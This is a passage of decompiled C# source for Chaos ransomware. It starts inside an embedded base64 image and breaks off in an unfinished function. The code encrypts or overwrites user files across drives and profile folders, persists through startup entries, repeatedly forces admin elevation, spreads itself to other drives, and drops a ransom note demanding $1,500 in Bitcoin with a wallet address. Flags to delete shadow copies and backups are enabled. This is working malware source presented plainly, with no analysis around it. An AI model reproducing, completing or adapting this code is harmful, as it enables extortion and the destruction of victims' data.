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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[15]
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zgKp39pWtkiKdMnyHOgCPiUtusxMhAYMmbD8N+BrT0BYehOaHxKQLWnn0E2dTQkaALtP3ryj4dwz0/7iGUtrdyw5FQvfu3de1jiWHK2DT/1MCBPXeOqRSWdfTG8aFE+IWuvpXady/soWY5gulnMZBW4z7NDw1kwoW8ylUY7OfH0=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
